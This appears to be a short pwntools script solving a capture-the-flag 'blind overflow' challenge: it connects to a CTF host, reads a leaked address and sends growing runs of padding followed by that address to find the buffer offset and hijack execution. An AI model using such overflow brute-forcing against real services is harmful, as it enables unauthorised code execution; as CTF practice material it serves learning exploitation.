from pwn import *

# blind overflow

for i in range(0,255, 2):
	p = remote("0.cloud.chals.io", 30096)

	p.recvuntil(b"at:")
	address = p.recvline()[:-1]
	print(address)

	address = int(address, 16)
	p.sendline(b"A"*i + p64(address))
	print(i)
	print(p.recvall())
